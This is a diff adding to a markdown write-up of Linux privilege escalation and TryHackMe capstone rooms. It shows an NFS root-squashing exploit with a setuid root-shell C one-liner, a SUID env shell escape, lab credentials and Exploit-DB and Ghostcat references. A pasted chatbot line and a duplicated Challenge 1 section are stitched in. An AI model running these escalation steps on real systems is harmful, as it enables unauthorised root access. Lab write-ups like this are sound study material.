@@ -802,5 +802,302 @@ And finally, we became root:
 
 ![Root Access](./Image/57.png)
 
-# Escalation path using NFS Root Squashing
+# Privilege Escalation via NFS Root Squashing
+
+To determine if a system is vulnerable to NFS root squashing, check the contents of the `/etc/exports` file:
+
+![Root Access](./Image/58.png)
+
+From the attacker’s machine, you can list the shared folders using:
+
+```bash
+showmount -e [IP]
+```
+
+![Root Access](./Image/59.png)
+
+Next, mount the shared folder with the following commands:
+
+```bash
+mkdir /tmp/mount
+mount -o rw,vers=2 10.10.158.65:/tmp /tmp/mount
+```
+
+Once mounted, you can compile and set permissions on a new executable:
+
+```bash
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/mount/x.c
+gcc /tmp/mount/x.c -o /tmp/mount/x
+chmod +s /tmp/mount/x
+```
+
+Finally, execute the compiled binary on the victim’s machine to obtain a root shell:
+
+```bash
+/tmp/x
+```
+
+This method leverages NFS root squashing to escalate privileges.
+
+# Capstone Challenge
+
+## 1
+
+Link: https://tryhackme.com/r/room/lazyadmin
+
+Found USER:PASS for http://10.10.169.27/content/as/index.php
+
+Found here: http://10.10.169.27/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+```bash
+manager:Password123
+```
+
+![Root Access](./Image/60.png)
+
+Version of Sweet Rice CMS found here: http://10.10.169.27/content/inc/lastest.txt
+
+```bash
+1.5.1
+```
+
+Found database password
+
+```bash
+rice:randompass
+```
+
+![Root Access](./Image/61.png)
+
+Using this exploit we uploaded a reverse shell: https://www.exploit-db.com/exploits/40716
+
+![Root Access](./Image/62.png)
+
+![Root Access](./Image/63.png)
+
+We can run this perl command as sudo
+
+![Root Access](./Image/64.png)
+
+I found that this perl script calls a bash script called ```/etc/copy.sh```
+
+And we got write permission on that ```copy.sh```
+
+So what I did is that 
+
+![Root Access](./Image/65.png)
+
+And with that we got root access
+
+Here's a more polished version of your documentation, maintaining a professional tone while preserving all images:
+
+---
+
+# Challenge Capstone
+
+## Challenge 1
+
+**Link:** [TryHackMe: Lazy Admin](https://tryhackme.com/r/room/lazyadmin)
+
+During the reconnaissance phase, we discovered valid credentials for accessing the application at the following URL: [http://10.10.169.27/content/as/index.php]
+
+[http://10.10.169.27/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql]
+
+**Credentials Found:**
+```bash
+manager:Password123
+```
+
+![Root Access](./Image/60.png)
+
+### Version Information
+
+The version of Sweet Rice CMS was identified at the following location: [http://10.10.169.27/content/inc/latest.txt]
+
+**Version Detected:**
+```bash
+1.5.1
+```
+
+Additionally, we located another set of credentials for the database:
+
+**Database Credentials:**
+```bash
+rice:randompass
+```
+
+![Root Access](./Image/61.png)
+
+### 2. Exploit Execution
+
+Using the identified vulnerabilities, we uploaded a reverse shell using an exploit found at [Exploit DB #40716](https://www.exploit-db.com/exploits/40716).
+
+![Reverse Shell Upload](./Image/62.png)
+
+![Exploit Confirmation](./Image/63.png)
+
+### 3. Privilege Escalation
+
+Upon gaining access, we found that we could execute a Perl command with elevated privileges.
+
+![Sudo Permissions](./Image/64.png)
+
+### Script Analysis
+
+Further investigation revealed that the Perl script in question invokes a Bash script located at `/etc/copy.sh`. Notably, we had write permissions on this script.
+
+**Script Path:**
+```bash
+/etc/copy.sh
+```
+
+#### Modification and Root Access
+
+To exploit this, we modified the `copy.sh` script to gain root access.
+
+![Modification of copy.sh](./Image/65.png)
+
+## Challenge 2: Anonymous Access
+
+**Link to the Task:** [TryHackMe: Anonymous](https://tryhackme.com/r/room/anonymous)
+
+### Nmap Scan Results
+
+During the Nmap scan, the following services and versions were identified:
+
+```bash
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.2.5.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+```
+
+### Exploiting FTP Anonymous Access
+
+Since the FTP service allowed anonymous user access, I connected to it and discovered the following:
+
+![Anonymous FTP Access](./Image/66.png)
+
+Within the FTP directory, I found a script named `clean.sh`. I theorized that if I modified this script and embedded a reverse shell, it might execute periodically via a cron job.
+
+![Modification of clean.sh](./Image/67.png)
+
+To my success, the modified script executed as intended.
+
+![Reverse Shell Execution](./Image/68.png)
+
+### Privilege Escalation
+
+Upon running `linpeas`, we identified that `/usr/bin/env` had the SUID bit set. 
+
+By executing the following command, we achieved root access:
+
+```bash
+/usr/bin/env /bin/sh -p
+```
+
+![Root Access via SUID](./Image/69.png)
+
+## Challenge 3
+
+### Room Link
+[TryHackMe Tomghost](https://tryhackme.com/r/room/tomghost)
+
+### Enumeration Results
+
+After scanning with Nmap, the following services were identified:
+
+```bash
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+53/tcp   open   tcpwrapped
+3168/tcp closed poweronnud
+8009/tcp open   ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open   http       Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.30
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+### Discovery and Exploitation
+
+1. **Apache Tomcat 9.0.30**:
+   - We identified that **Apache Tomcat 9.0.30** was running on port **8080**. Research indicated a known vulnerability, [Ghostcat (CVE-2020-1938)](https://www.rapid7.com/db/modules/auxiliary/admin/http/tomcat_ghostcat), exploitable using Metasploit’s `tomcat_ghostcat` module.
+   
+2. **Using the Ghostcat Exploit**:
+   - This exploit revealed a set of **credentials**:
+     ```plaintext
+     USER:PASS - skyfuck:8730281lkjlkjdqlksalks
+     ```
+
+   ![Root Access via SUID](./Image/70.png)
+
+3. **SSH Login**:
+   - With these credentials, SSH access was achieved.
+
+4. **Finding `user.txt` Flag**:
+   - Navigating to another user’s directory, we located the **`user.txt` flag**.
+
+   ![Root Access via SUID](./Image/71.png)
+
+5. **Discovering PGP Key and Encrypted File**:
+   - In the `/home/skyfuck` folder, a **PGP key** and an **encrypted file** were found.
+
+   ![Root Access via SUID](./Image/72.png)
+
+6. **Cracking the PGP Key**:
+   - Although we didn’t have the passphrase for the PGP key, we were able to **crack it using John the Ripper**.
+
+   ![Root Access via SUID](./Image/73.png)
+
+7. **New Credentials for `merlin`**:
+   - After cracking, we retrieved the following credentials:
+     ```plaintext
+     merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+     ```
+
+   ![Root Access via SUID](./Image/74.png)
+
+8. **Privilege Escalation Using `zip`**:
+   - We discovered that the `zip` command could be executed as **root without a password**. This allowed for an easy privilege escalation to root.
+
+   ![Root Access via SUID](./Image/75.png)
+
+9. **Gaining Root Access**:
+   - With this escalation method, root access was successfully obtained.
+
+   ![Root Access via SUID](./Image/76.png)
+
+10. **Root Flag Obtained**.
+
+   ![Root Access via SUID](./Image/77.png)
+
+## Challenge 4
+
+** todo **
+
+   ![Root Access via SUID](./Image/000.png)
+
+tips on room 4 & 5 in video
 
